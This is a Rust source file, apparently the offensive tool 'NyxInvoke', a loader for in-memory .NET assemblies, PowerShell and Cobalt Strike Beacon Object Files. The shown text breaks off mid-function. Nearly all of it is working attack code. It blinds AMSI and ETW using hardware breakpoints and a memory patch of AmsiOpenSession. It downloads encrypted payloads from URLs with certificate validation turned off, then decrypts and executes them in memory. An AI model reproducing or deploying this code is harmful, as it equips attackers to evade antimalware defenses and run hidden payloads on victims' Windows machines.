#![allow(non_snake_case, non_camel_case_types,dead_code)]

use std::{
    ffi::{CString, CStr},
    ptr::null_mut,
    io::{self, Read, Write},
    fs::File,
    mem::{zeroed, size_of},
    sync::Once,
    ptr::{self},
};

use winapi::{
    ctypes::{c_void, c_char},
    shared::{
        minwindef::{ULONG,DWORD, HMODULE, BYTE, BOOL, LPVOID},
        ntdef::{NT_SUCCESS, NTSTATUS, OBJECT_ATTRIBUTES},
        ntstatus::STATUS_SUCCESS,
    },
    um::{
        errhandlingapi::AddVectoredExceptionHandler,
        libloaderapi::{GetProcAddress, GetModuleHandleA, LoadLibraryA},
        winnt::{
            EXCEPTION_POINTERS, CONTEXT, LONG, CONTEXT_ALL, HANDLE, ACCESS_MASK,
            THREAD_ALL_ACCESS, PVOID,PAGE_READWRITE
        },
        minwinbase::EXCEPTION_SINGLE_STEP,
        wincon::{AttachConsole, ATTACH_PARENT_PROCESS},
        processenv::GetStdHandle,
        winbase::{STD_OUTPUT_HANDLE, STD_ERROR_HANDLE},
        handleapi::INVALID_HANDLE_VALUE,
        fileapi::{FlushFileBuffers, WriteFile},
        memoryapi::VirtualProtect,
    },
    vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH},
};

use ntapi::{
    ntexapi::{
        SYSTEM_PROCESS_INFORMATION, SYSTEM_THREAD_INFORMATION, SystemProcessInformation,
    },
    ntpsapi::{PROCESS_BASIC_INFORMATION,NtCurrentProcess},
    ntmmapi::{NtProtectVirtualMemory,NtReadVirtualMemory,NtWriteVirtualMemory},
};

use clroxide::{
    clr::Clr,
    primitives::{_Assembly, wrap_method_arguments, wrap_string_in_variant},
};

use reqwest::blocking::{get, Client};
use clap::{Parser, Subcommand};

use crypto::{
    buffer::{BufferResult, ReadBuffer, WriteBuffer},
    aes, blockmodes, buffer, symmetriccipher,
};

use coffee_ldr::loader::Coffee;
use base64::{Engine as _, engine::general_purpose};


const AMSI_RESULT_CLEAN: i32 = 0;
const PATCH: [u8; 1] = [0xEB];
const S_OK: i32 = 0;
static INIT: Once = Once::new();

static mut AMSI_SCAN_BUFFER_PTR: Option<*mut u8> = None;
static mut NT_TRACE_CONTROL_PTR: Option<*mut u8> = None;
static mut ONE_MESSAGE: i32 = 1;
static mut STDERR_HANDLE: *mut c_void = INVALID_HANDLE_VALUE;
static mut STDOUT_HANDLE: *mut c_void = INVALID_HANDLE_VALUE;

#[repr(C)]
struct CLIENT_ID {
    UniqueProcess: *mut c_void,
    UniqueThread: *mut c_void,
}

extern "stdcall" {
    fn NtGetContextThread(thread_handle: HANDLE, thread_context: *mut CONTEXT) -> ULONG;

    fn NtSetContextThread(thread_handle: HANDLE, thread_context: *mut CONTEXT) -> ULONG;
    fn NtQuerySystemInformation(
        SystemInformationClass: ULONG,
        SystemInformation: *mut c_void,
        SystemInformationLength: ULONG,
        ReturnLength: *mut ULONG,
    ) -> NTSTATUS;
    fn NtQueryInformationProcess(
        ProcessHandle: HANDLE,
        ProcessInformationClass: ULONG,
        ProcessInformation: *mut c_void,
        ProcessInformationLength: ULONG,
        ReturnLength: *mut ULONG,
    ) -> NTSTATUS;
    fn NtOpenThread(
        ThreadHandle: *mut HANDLE,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: *const OBJECT_ATTRIBUTES,
        ClientId: *const CLIENT_ID,
    ) -> NTSTATUS;
    fn NtClose(Handle: HANDLE) -> NTSTATUS;
}



// Bit Manipulation Function
fn set_bits(dw: u64, low_bit: usize, bits: usize, new_value: u64) -> u64 {
    let mask = if bits >= 64 {
        u64::MAX
    } else {
        (1u64 << bits) - 1
    };
    (dw & !(mask << low_bit)) | ((new_value & mask) << low_bit)
}

// Clears a hardware breakpoint at the given index
fn clear_breakpoint(ctx: &mut CONTEXT, index: usize) {
    if index >= 4 {
        return; // Maximum of 4 hardware breakpoints (Dr0 to Dr3)
    }
    let dr_ptr = unsafe { &mut *(&mut ctx.Dr0 as *mut u64).add(index) };
    *dr_ptr = 0;
    ctx.Dr7 = set_bits(ctx.Dr7, index * 2, 1, 0);
    ctx.Dr6 = 0;
    ctx.EFlags = 0;
}

// Enables a hardware breakpoint at the given address and index
fn enable_breakpoint(ctx: &mut CONTEXT, address: *mut u8, index: usize) {
    if index >= 4 {
        return; // Maximum of 4 hardware breakpoints
    }
    let dr_ptr = unsafe { &mut *(&mut ctx.Dr0 as *mut u64).add(index) };
    *dr_ptr = address as u64;
    ctx.Dr7 = set_bits(ctx.Dr7, 16, 16, 0); // Disable all local breakpoints
    ctx.Dr7 = set_bits(ctx.Dr7, index * 2, 1, 1); // Enable the specific breakpoint
    ctx.Dr6 = 0;
}

// Retrieves function arguments from the CPU context based on index
fn get_arg(ctx: &CONTEXT, index: usize) -> usize {
    match index {
        0 => ctx.Rcx as usize,
        1 => ctx.Rdx as usize,
        2 => ctx.R8 as usize,
        3 => ctx.R9 as usize,
        _ => unsafe {
            *((ctx.Rsp as *const u64).add(index + 1) as *const usize)
        },
    }
}

// Obtains the return address from the stack
fn get_return_address(ctx: &CONTEXT) -> usize {
    unsafe { *(ctx.Rsp as *const usize) }
}

// Sets the result in the CPU context (RAX register)
fn set_result(ctx: &mut CONTEXT, result: usize) {
    ctx.Rax = result as u64;
}

// Adjusts the stack pointer (RSP register)
fn adjust_stack_pointer(ctx: &mut CONTEXT, amount: i32) {
    ctx.Rsp = ctx.Rsp.wrapping_add(amount as u64);
}

// Sets the instruction pointer (RIP register)
fn set_ip(ctx: &mut CONTEXT, new_ip: usize) {
    ctx.Rip = new_ip as u64;
}

// Exception Handler Function
unsafe extern "system" fn exception_handler(exceptions: *mut EXCEPTION_POINTERS) -> LONG {
    if exceptions.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let exception_record = (*exceptions).ExceptionRecord;
    let context_record = (*exceptions).ContextRecord;

    if exception_record.is_null() || context_record.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let context = &mut *context_record;
    let exception_code = (*exception_record).ExceptionCode;
    let exception_address = (*exception_record).ExceptionAddress as usize;

    if exception_code == EXCEPTION_SINGLE_STEP {
        // AMSI Bypass
        if let Some(amsi_address) = AMSI_SCAN_BUFFER_PTR {
            if exception_address == amsi_address as usize {
                println!("[+] AMSI Bypass invoked at address: {:#X}", exception_address);
                let return_address = get_return_address(context);
                let scan_result_ptr = get_arg(context, 5) as *mut i32;
                *scan_result_ptr = AMSI_RESULT_CLEAN;

                set_ip(context, return_address);
                adjust_stack_pointer(context, size_of::<*mut u8>() as i32);
                set_result(context, S_OK as usize);

                clear_breakpoint(context, 0);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        // NtTraceControl Bypass
        if let Some(nt_trace_address) = NT_TRACE_CONTROL_PTR {
            if exception_address == nt_trace_address as usize {
                println!(
                    "[+] NtTraceControl Bypass invoked at address: {:#X}",
                    exception_address
                );
                if let Some(new_rip) = find_gadget(exception_address, b"\xc3", 1, 500) {
                    context.Rip = new_rip as u64;
                }

                clear_breakpoint(context, 1);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }

    EXCEPTION_CONTINUE_SEARCH
}

// Searches for a specific byte pattern (gadget) within a memory range
fn find_gadget(function: usize, stub: &[u8], size: usize, dist: usize) -> Option<usize> {
    (0..dist).find_map(|i| {
        let ptr = function + i;
        unsafe {
            if std::slice::from_raw_parts(ptr as *const u8, size) == stub {
                Some(ptr)
            } else {
                None
            }
        }
    })
}

// Retrieves the current process ID using NtQueryInformationProcess
fn get_current_process_id() -> u32 {
    let pseudo_handle = -1isize as HANDLE;
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let status = unsafe {
        NtQueryInformationProcess(
            pseudo_handle,
            0, // ProcessBasicInformation
            &mut pbi as *mut _ as PVOID,
            size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            null_mut(),
        )
    };

    if status != STATUS_SUCCESS {
        1
    } else {
        pbi.UniqueProcessId as u32
    }
}

// Sets up the AMSI and NtTraceControl bypass mechanisms
fn setup_bypass() -> Result<*mut std::ffi::c_void, String> {
    let mut thread_ctx: CONTEXT = unsafe { zeroed() };
    thread_ctx.ContextFlags = CONTEXT_ALL;

    unsafe {
        // Resolve AMSI_SCAN_BUFFER_PTR
        if AMSI_SCAN_BUFFER_PTR.is_none() {
            let module_name = CString::new("amsi.dll").unwrap();
            let mut module_handle = GetModuleHandleA(module_name.as_ptr());

            if module_handle.is_null() {
                module_handle = LoadLibraryA(module_name.as_ptr());
                if module_handle.is_null() {
                    return Err("Failed to load amsi.dll".to_string());
                }
            }

            let function_name = CString::new("AmsiScanBuffer").unwrap();
            let amsi_scan_buffer = GetProcAddress(module_handle, function_name.as_ptr());

            if amsi_scan_buffer.is_null() {
                return Err("Failed to get address for AmsiScanBuffer".to_string());
            }

            AMSI_SCAN_BUFFER_PTR = Some(amsi_scan_buffer as *mut u8);
        }

        // Resolve NT_TRACE_CONTROL_PTR
        if NT_TRACE_CONTROL_PTR.is_none() {
            let ntdll_module_name = CString::new("ntdll.dll").unwrap();
            let ntdll_module_handle = GetModuleHandleA(ntdll_module_name.as_ptr());

            let ntdll_function_name = CString::new("NtTraceControl").unwrap();
            let ntdll_function_ptr = GetProcAddress(ntdll_module_handle, ntdll_function_name.as_ptr());

            if ntdll_function_ptr.is_null() {
                return Err("Failed to get address for NtTraceControl".to_string());
            }

            NT_TRACE_CONTROL_PTR = Some(ntdll_function_ptr as *mut u8);
        }
    }

    // Register the exception handler
    let h_ex_handler = unsafe { AddVectoredExceptionHandler(1, Some(exception_handler)) };

    // Retrieve the current process ID
    let process_id = get_current_process_id();

    // Retrieve handles to all threads of the current process
    let thread_handles = get_remote_thread_handle(process_id)?;

    for thread_handle in &thread_handles {
        // Get the context of the thread
        if unsafe { NtGetContextThread(*thread_handle, &mut thread_ctx) } != 0 {
            return Err("Failed to get thread context".to_string());
        }

        // Enable breakpoints on AMSI and NtTraceControl
        unsafe {
            if let Some(amsi_ptr) = AMSI_SCAN_BUFFER_PTR {
                enable_breakpoint(&mut thread_ctx, amsi_ptr, 0);
            }
            if let Some(nt_trace_ptr) = NT_TRACE_CONTROL_PTR {
                enable_breakpoint(&mut thread_ctx, nt_trace_ptr, 1);
            }
        }

        // Set the modified context back to the thread
        if unsafe { NtSetContextThread(*thread_handle, &mut thread_ctx as *mut CONTEXT) } != 0 {
            return Err("Failed to set thread context".to_string());
        }

        // Close the thread handle
        unsafe { NtClose(*thread_handle) };
    }

    Ok(h_ex_handler)
}

// Retrieves handles to all threads of the specified process
fn get_remote_thread_handle(process_id: u32) -> Result<Vec<HANDLE>, String> {
    let mut buffer: Vec<u8> = Vec::with_capacity(1024 * 1024);
    let mut return_length: ULONG = 0;

    // Query system information to get process and thread details
    let status = unsafe {
        NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_mut_ptr() as PVOID,
            buffer.capacity() as ULONG,
            &mut return_length,
        )
    };

    if !NT_SUCCESS(status) {
        return Err("Failed to call NtQuerySystemInformation".to_owned());
    }

    unsafe {
        buffer.set_len(return_length as usize);
    }

    let mut offset: usize = 0;
    let mut thread_handles: Vec<HANDLE> = Vec::new();

    while offset < buffer.len() {
        let process_info: &SYSTEM_PROCESS_INFORMATION =
            unsafe { &*(buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION) };

        if process_info.UniqueProcessId == process_id as PVOID {
            let thread_array_base = (process_info as *const _ as usize)
                + size_of::<SYSTEM_PROCESS_INFORMATION>()
                - size_of::<SYSTEM_THREAD_INFORMATION>();

            for i in 0..process_info.NumberOfThreads as usize {
                let thread_info_ptr = (thread_array_base
                    + i * size_of::<SYSTEM_THREAD_INFORMATION>())
                    as *const SYSTEM_THREAD_INFORMATION;
                let thread_info = unsafe { &*thread_info_ptr };

                let mut thread_handle: HANDLE = null_mut();
                let mut object_attrs: OBJECT_ATTRIBUTES = unsafe { zeroed() };
                let mut client_id: CLIENT_ID = unsafe { zeroed() };
                client_id.UniqueThread = thread_info.ClientId.UniqueThread;

                let status = unsafe {
                    NtOpenThread(
                        &mut thread_handle,
                        THREAD_ALL_ACCESS,
                        &mut object_attrs,
                        &mut client_id,
                    )
                };

                if NT_SUCCESS(status) {
                    thread_handles.push(thread_handle);
                }
            }
        }

        if process_info.NextEntryOffset == 0 {
            break;
        }
        offset += process_info.NextEntryOffset as usize;
    }

    if thread_handles.is_empty() {
        return Err("Failed to find any threads".to_owned());
    }

    Ok(thread_handles)
}

fn aes_decrypt(encrypted_data: &[u8],key: &[u8],iv: &[u8]) -> Result<Vec<u8>, symmetriccipher::SymmetricCipherError> {
    let mut decryptor =
        aes::cbc_decryptor(aes::KeySize::KeySize256, key, iv, blockmodes::PkcsPadding);

    let mut final_result = Vec::<u8>::new();
    let mut read_buffer = buffer::RefReadBuffer::new(encrypted_data);
    let mut buffer = [0; 4096];
    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);

    loop {
        let result = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
        final_result.extend(
            write_buffer
                .take_read_buffer()
                .take_remaining()
                .iter()
                .map(|&i| i),
        );
        match result {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => {}
        }
    }

    Ok(final_result)
}

unsafe fn runspace_execute(command: &str) -> Result<String, String> {
    
    // Initialize the CLR
    let mut clr = Clr::context_only(None)?;
    let context = clr.get_context()?;
    let app_domain = context.app_domain;
    let mscorlib = (*app_domain).load_library("mscorlib")?;

    // Load the 'System.Management.Automation' assembly
    let assembly_type = (*mscorlib).get_type("System.Reflection.Assembly")?;
    let assembly_load_with_partial_name_fn = (*assembly_type).get_method_with_signature(
        "System.Reflection.Assembly LoadWithPartialName(System.String)",
    )?;
    let automation_variant = (*assembly_load_with_partial_name_fn).invoke(
        wrap_method_arguments(vec![wrap_string_in_variant("System.Management.Automation")])?,
        None,
    )?;
    let automation =
        automation_variant.Anonymous.Anonymous.Anonymous.byref as *mut _ as *mut _Assembly;

    // Get types
    let psobject_type = (*automation).get_type("System.Management.Automation.PSObject")?;
    let runspace_factory_type =
        (*automation).get_type("System.Management.Automation.Runspaces.RunspaceFactory")?;
    let runspace_pipeline_commands_type =
        (*automation).get_type("System.Management.Automation.Runspaces.CommandCollection")?;
    let runspace_pipeline_reader_type = (*automation).get_type(
        "System.Management.Automation.Runspaces.PipelineReader`1[System.Management.Automation.PSObject]"
    )?;
    let runspace_pipeline_type =
        (*automation).get_type("System.Management.Automation.Runspaces.Pipeline")?;
    let runspace_type =
        (*automation).get_type("System.Management.Automation.Runspaces.Runspace")?;

    // Get functions
    let commands_addscript_fn = (*runspace_pipeline_commands_type)
        .get_method_with_signature("Void AddScript(System.String)")?;
    let pipeline_create_fn = (*runspace_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.Pipeline CreatePipeline()",
    )?;
    let pipeline_getoutput_fn = (*runspace_pipeline_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.PipelineReader`1[System.Management.Automation.PSObject] get_Output()"
    )?;

    let pipeline_invoke_async_fn =
        (*runspace_pipeline_type).get_method_with_signature("Void InvokeAsync()")?;
    let pipeline_reader_read_fn = (*runspace_pipeline_reader_type)
        .get_method_with_signature("System.Management.Automation.PSObject Read()")?;
    let psobject_tostring_fn =
        (*psobject_type).get_method_with_signature("System.String ToString()")?;
    let runspace_create_fn = (*runspace_factory_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.Runspace CreateRunspace()",
    )?;
    let runspace_dispose_fn = (*runspace_type).get_method("Dispose")?;
    let runspace_open_fn = (*runspace_type).get_method("Open")?;

    // Create the runspace and pipeline
    let runspace = (*runspace_create_fn).invoke_without_args(None)?;
    let pipeline = (*pipeline_create_fn).invoke_without_args(Some(runspace.clone()))?;



    // Open the runspace
    (*runspace_open_fn).invoke_without_args(Some(runspace.clone()))?;

    // Access the pipeline commands property, and add our script
    let pipeline_commands_property = (*runspace_pipeline_type).get_property("Commands")?;
    let commands_collection = (*pipeline_commands_property).get_value(Some(pipeline.clone()))?;
    (*commands_addscript_fn).invoke(
        wrap_method_arguments(vec![wrap_string_in_variant(
            format!("{} | Out-String", command).as_str(),
        )])?,
        Some(commands_collection),
    )?;

    // Invoke the pipeline asynchronously
    (*pipeline_invoke_async_fn).invoke_without_args(Some(pipeline.clone()))?;

    // Read the output
    let reader = (*pipeline_getoutput_fn).invoke_without_args(Some(pipeline.clone()))?;
    let reader_read = (*pipeline_reader_read_fn).invoke_without_args(Some(reader.clone()))?;
    let reader_read_tostring =
        (*psobject_tostring_fn).invoke_without_args(Some(reader_read.clone()))?;
    let output = reader_read_tostring
        .Anonymous
        .Anonymous
        .Anonymous
        .bstrVal
        .to_string();

    // Clean up the runspace
    (*runspace_dispose_fn).invoke_without_args(Some(runspace.clone()))?;

    Ok(output)
}



fn search_pattern(start_address: &[u8], pattern: &[u8]) -> usize {
    for i in 0..1024 {
        if start_address[i] == pattern[0] {
            let mut j = 1;
            while j < pattern.len() && i + j < start_address.len() && 
                  (pattern[j] == b'?' || start_address[i + j] == pattern[j]) {
                j += 1;
            }
            if j == pattern.len() {
                return i + 3;
            }
        }
    }
    1024
}


fn patch_amsi() -> Result<(), String> {
    let pattern: [BYTE; 9] = [0x48, b'?', b'?', 0x74, b'?', 0x48, b'?', b'?', 0x74];
    let amsi_dll = CString::new("amsi.dll").unwrap();
    let hm: HMODULE = unsafe { GetModuleHandleA(amsi_dll.as_ptr()) };
    
    if hm.is_null() {
        return Err("Failed to get handle to amsi.dll".to_string());
    }
    let amsi_open_session = CString::new("AmsiOpenSession").unwrap();
    let amsi_addr = unsafe { GetProcAddress(hm, amsi_open_session.as_ptr()) };
    let mut buff: [BYTE; 1024] = [0; 1024];
    let mut bytes_read: usize = 0;
    let status = unsafe {
        NtReadVirtualMemory(
            NtCurrentProcess,
            amsi_addr as *mut std::ffi::c_void,
            buff.as_mut_ptr() as PVOID,
            buff.len(),
            &mut bytes_read
        )
    };
    
    if status != 0 {
        return Err(format!("Failed to read memory. Status: {}", status));
    }
    
    let match_address = search_pattern(&buff, &pattern);
    if match_address == 1024 {
        return Err("Pattern not found".to_string());
    }
    
    unsafe {
        if ONE_MESSAGE == 1 {
            println!("[+] AmsiOpenSession patched at address {:#X}", amsi_addr as usize);
            ONE_MESSAGE = 0;
        }
    }
    
    let update_amsi_address = (amsi_addr as usize) + match_address;
    
    let mut old_protect: ULONG = 0;
    let mut size = PATCH.len();
    let mut base = update_amsi_address as PVOID;
    let status = unsafe {
        NtProtectVirtualMemory(
            NtCurrentProcess,
            &mut base,
            &mut size,
            PAGE_READWRITE,
            &mut old_protect
        )
    };
    
    if status != 0 {
        return Err(format!("Failed to change memory protection. Status: {}", status));
    }
    
    let mut bytes_written: usize = 0;
    let status = unsafe {
        NtWriteVirtualMemory(
            NtCurrentProcess,
            update_amsi_address as PVOID,
            PATCH.as_ptr() as PVOID,
            PATCH.len(),
            &mut bytes_written
        )
    };
    
    if status != 0 {
        return Err(format!("Failed to write memory. Status: {}", status));
    }
    
    let mut _temp: ULONG = 0;
    let status = unsafe {
        NtProtectVirtualMemory(
            NtCurrentProcess,
            &mut base,
            &mut size,
            old_protect,
            &mut _temp
        )
    };
    
    if status != 0 {
        return Err(format!("Failed to restore memory protection. Status: {}", status));
    }
    
    Ok(())
}




fn read_file(filename: &str) -> Result<Vec<u8>, String> {
    let mut file =
        File::open(filename).map_err(|e| format!("Failed to open file {}: {}", filename, e))?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)
        .map_err(|e| format!("Failed to read file {}: {}", filename, e))?;
    Ok(contents)
}

fn fetch_file_from_url(url: &str) -> Result<Vec<u8>, String> {
    // Build a custom client that disables SSL certificate validation
    let client = Client::builder()
        .danger_accept_invalid_certs(true) // Allow self-signed or invalid certificates
        .build()
        .map_err(|e| format!("Failed to build the HTTP client: {}", e))?;

    // Make the request using the custom client
    let response = client
        .get(url)
        .send()
        .map_err(|e| format!("Failed to fetch the URL {}: {}", url, e))?;

    if !response.status().is_success() {
        return Err(format!(
            "Non-success response from {}: {}",
            url,
            response.status()
        ));
    }

    let bytes = response
        .bytes()
        .map_err(|e| format!("Failed to read response from {}: {}", url, e))?;
    Ok(bytes.to_vec())
}


fn parse_bof_arguments(args: &[String]) -> Result<Vec<u8>, String> {
    let mut parsed_args = Vec::new();
    for arg in args {
        let parts: Vec<&str> = arg.splitn(2, '=').collect();
        if parts.len() != 2 {
            return Err(format!("Invalid argument format: {}. Use <type>=<value>", arg));
        }
        let (arg_type, value) = (parts[0], parts[1]);
        match arg_type {
            "str" => {
                let bytes = value.as_bytes();
                parsed_args.extend_from_slice(&(bytes.len() as u32).to_le_bytes());
                parsed_args.extend_from_slice(bytes);
                parsed_args.push(0); // null terminator
            },
            "wstr" => {
                let wide_bytes: Vec<u16> = value.encode_utf16().collect();
                parsed_args.extend_from_slice(&((wide_bytes.len() + 1) as u32).to_le_bytes());
                for wide_char in wide_bytes {
                    parsed_args.extend_from_slice(&wide_char.to_le_bytes());
                }
                parsed_args.extend_from_slice(&[0, 0]); // null terminator for wide string
            },
            "int" => {
                let int_value = value.parse::<i32>()
                    .map_err(|e| format!("Failed to parse int: {}", e))?;
                parsed_args.extend_from_slice(&int_value.to_le_bytes());
            },
            "short" => {
                let short_value = value.parse::<i16>()
                    .map_err(|e| format!("Failed to parse short: {}", e))?;
                parsed_args.extend_from_slice(&short_value.to_le_bytes());
            },
            "bin" => {
                let decoded = general_purpose::STANDARD.decode(value)
                    .map_err(|e| format!("Failed to decode base64: {}", e))?;
                parsed_args.extend_from_slice(&(decoded.len() as u32).to_le_bytes());
                parsed_args.extend_from_slice(&decoded);
            },
            _ => return Err(format!("Unsupported argument type: {}", arg_type)),
        }
    }
    Ok(parsed_args)
}





#[cfg(feature = "compiled_clr")]
#[link_section = ".rdata"]
pub fn compiled_clr() -> (&'static [u8], [u8; 32], [u8; 16]) {
    (
        &*include_bytes!("../Resources/clr_data.enc"),
        *include_bytes!("../Resources/clr_aes.key"),
        *include_bytes!("../Resources/clr_aes.iv"),
    )
}

// Optionally, provide a stub when the feature is not enabled
#[cfg(not(feature = "compiled_clr"))]
pub fn compiled_clr() -> Option<(&'static [u8], [u8; 32], [u8; 16])> {
    None
}

#[cfg(feature = "compiled_bof")]
#[link_section = ".rdata"]
pub fn compiled_bof() -> (&'static [u8], [u8; 32], [u8; 16]) {
    (
        &*include_bytes!("../Resources/bof_data.enc"),
        *include_bytes!("../Resources/bof_aes.key"),
        *include_bytes!("../Resources/bof_aes.iv"),
    )
}

// Optionally, provide a stub when the feature is not enabled
#[cfg(not(feature = "compiled_bof"))]
pub fn compiled_bof() -> Option<&'static [u8]> {
    None
}


#[derive(Parser)]
#[command(
    name = "NyxInvoke",
    about = "Patchless inline-execute assembly / COFF Loader",
    version = "0.3.0",
    author = "BlackSnufkin"
)]
pub struct Cli {
    #[command(subcommand)]
    pub mode: Mode,
}

#[derive(Subcommand)]
pub enum Mode {
    /// Execute Common Language Runtime (CLR) assemblies
    #[command(
        long_about = "Execute .NET assemblies using the Common Language Runtime (CLR).",
        after_help = "Example: NyxInvoke.exe clr --assembly payload.enc --key key.bin --iv iv.bin --args \"arg1 arg2\""
    )]
    Clr {
        /// Arguments to pass to the assembly
        #[arg(long, value_name = "ARGS", num_args = 1.., value_delimiter = ' ')]
        args: Vec<String>,

        /// Base URL or path for resources
        #[arg(long, value_name = "URL_OR_PATH")]
        base: Option<String>,

        /// Path to the encryption key file
        #[arg(long, value_name = "KEY_FILE")]
        key: Option<String>,

        /// Path to the initialization vector (IV) file
        #[arg(long, value_name = "IV_FILE")]
        iv: Option<String>,

        /// Path or URL to the encrypted assembly file to execute
        #[arg(long, value_name = "ASSEMBLY_FILE")]
        assembly: Option<String>,
    },

    /// Execute PowerShell commands or scripts
    #[command(
        long_about = "Execute PowerShell commands or scripts.",
        after_help = "Examples:\nNyxInvoke.exe ps --command \"Get-Process\"\nNyxInvoke.exe ps --script script.ps1"
    )]
    Ps {
        /// PowerShell command to execute
        #[arg(long, group = "ps_input")]
        command: Option<String>,

        /// Path to PowerShell script file to execute
        #[arg(long, group = "ps_input")]
        script: Option<String>,
    },

    /// Execute Beacon Object Files (BOF)
    #[command(
        long_about = "Execute Beacon Object Files (BOF) for Cobalt Strike.",
        after_help = "Example: NyxInvoke.exe bof --bof payload.enc --key key.bin --iv iv.bin --args \"arg1 arg2\""
    )]
    Bof {
        /// Arguments to pass to the BOF
        #[arg(long, value_name = "ARGS", num_args = 1.., value_delimiter = ' ')]
        args: Option<Vec<String>>,

        /// Base URL or path for resources
        #[arg(long, value_name = "URL_OR_PATH")]
        base: Option<String>,

        /// Path to the encryption key file
        #[arg(long, value_name = "KEY_FILE")]
        key: Option<String>,

        /// Path to the initialization vector (IV) file
        #[arg(long, value_name = "IV_FILE")]
        iv: Option<String>,

        /// Path or URL to the encrypted BOF file to execute
        #[arg(long, value_name = "BOF_FILE")]
        bof: Option<String>,
    },
}





pub fn execute_clr_mode(args: Vec<String>, base: Option<String>, key: Option<String>, iv: Option<String>, assembly: Option<String>) -> Result<(), String> {
    // Determine data, key_bytes, iv_bytes
    let (data, key_bytes, iv_bytes) = if let (Some(key_path), Some(iv_path), Some(assembly_path)) = (key, iv, assembly) {
        // User provided key, iv, and assembly

        // If 'base' is provided, construct full paths or URLs
        let (key_full_path, iv_full_path, assembly_full_path) = if let Some(base_path) = base {
            (
                format!("{}/{}", base_path, key_path),
                format!("{}/{}", base_path, iv_path),
                format!("{}/{}", base_path, assembly_path),
            )
        } else {
            (key_path, iv_path, assembly_path)
        };

        // Decide whether to fetch from URL or read from file based on whether paths start with "http"
        let key_bytes = if key_full_path.starts_with("http") || key_full_path.starts_with("https") {
            fetch_file_from_url(&key_full_path)?
        } else {
            read_file(&key_full_path)?
        };

        let iv_bytes = if iv_full_path.starts_with("http") || iv_full_path.starts_with("https") {
            fetch_file_from_url(&iv_full_path)?
        } else {
            read_file(&iv_full_path)?
        };

        let data = if assembly_full_path.starts_with("http") || assembly_full_path.starts_with("http") {
            fetch_file_from_url(&assembly_full_path)?
        } else {
            read_file(&assembly_full_path)?
        };

        (data, key_bytes, iv_bytes)
    } else {
        // Use compiled data
        #[cfg(feature = "compiled_clr")]
        {
            let (data_ref, key_ref, iv_ref) = compiled_clr();
            (
                data_ref.to_vec(),
                key_ref.to_vec(),
                iv_ref.to_vec(),
            )
        }

        #[cfg(not(feature = "compiled_clr"))]
        {
            return Err("Compiled data is not included in this build. Enable the 'compiled_clr' feature to include it.".to_string());
        }
    };

    // Proceed with data, key_bytes, iv_bytes
    setup_bypass()?;
    
    let decrypted_data = aes_decrypt(&data, &key_bytes, &iv_bytes)
        .map_err(|e| format!("[!] Decryption failed: {:?}", e))?;
    println!("[+] Decryption successful!");

    let mut clr = Clr::new(decrypted_data, args)
        .map_err(|e| format!("Clr initialization failed: {:?}", e))?;
    let results = clr
        .run()
        .map_err(|e| format!("Clr run failed: {:?}", e))?;
    println!("[+] Results:\n\n{}", results);
    
    Ok(())
}

pub fn execute_ps_mode(command: Option<String>, script: Option<String>) -> Result<(), String> {
    setup_bypass()?;
    patch_amsi();
    if let Some(cmd) = command {
        // Execute the PowerShell command
        let result = unsafe { runspace_execute(&cmd) };
        match result {
            Ok(output) => println!("[+] Output:\n{}", output),
            Err(err) => return Err(format!("[!] Error: {}", err)),
        }
    } else if let Some(script_path_or_url) = script {
        // Pass the script path or URL directly to runspace_execute_script
        let result = unsafe { runspace_execute(&script_path_or_url) };
        match result {
            Ok(output) => println!("[+] Output:\n{}", output),
            Err(err) => return Err(format!("[!] Error: {}", err)),
        }
    } else {
        return Err("Either --command or --script must be provided.".to_string());
    }
    
    Ok(())
}

pub fn execute_bof_mode(args: Option<Vec<String>>, base: Option<String>, key: Option<String>, iv: Option<String>, bof: Option<String>) -> Result<(), String> {
    // Determine data, key_bytes, iv_bytes
    let (bof_data, key_bytes, iv_bytes) = if let (Some(key_path), Some(iv_path), Some(bof_path)) = (key, iv, bof) {
        // User provided key, iv, and bof

        // If 'base' is provided, construct full paths or URLs
        let (key_full_path, iv_full_path, bof_full_path) = if let Some(base_path) = base {
            (
                format!("{}/{}", base_path, key_path),
                format!("{}/{}", base_path, iv_path),
                format!("{}/{}", base_path, bof_path),
            )
        } else {
            (key_path, iv_path, bof_path)
        };

        // Decide whether to fetch from URL or read from file based on whether paths start with "http"
        let key_bytes = if key_full_path.starts_with("http") || key_full_path.starts_with("https") {
            fetch_file_from_url(&key_full_path)?
        } else {
            read_file(&key_full_path)?
        };

        let iv_bytes = if iv_full_path.starts_with("http") || iv_full_path.starts_with("https") {
            fetch_file_from_url(&iv_full_path)?
        } else {
            read_file(&iv_full_path)?
        };

        let data = if bof_full_path.starts_with("http") || bof_full_path.starts_with("https") {
            fetch_file_from_url(&bof_full_path)?
        } else {
            read_file(&bof_full_path)?
        };

        (data, key_bytes, iv_bytes)
    } else {
        // Use compiled BOF data
        #[cfg(feature = "compiled_bof")]
        {
            let (data_ref, key_ref, iv_ref) = compiled_bof();
            (
                data_ref.to_vec(),
                key_ref.to_vec(),
                iv_ref.to_vec(),
            )
        }

        #[cfg(not(feature = "compiled_bof"))]
        {
            return Err("Compiled BOF data is not included in this build. Enable the 'compiled_bof' feature to include it.".to_string());
        }
    };

    // Decrypt the BOF data
    let decrypted_bof_data = aes_decrypt(&bof_data, &key_bytes, &iv_bytes)
        .map_err(|e| format!("[!] Decryption failed: {:?}", e))?;
    println!("[+] BOF Decryption successful!");

    // Parse and prepare arguments
    let parsed_args = match args {
        Some(arg_vec) => parse_bof_arguments(&arg_vec)?,
        None => vec![],
    };

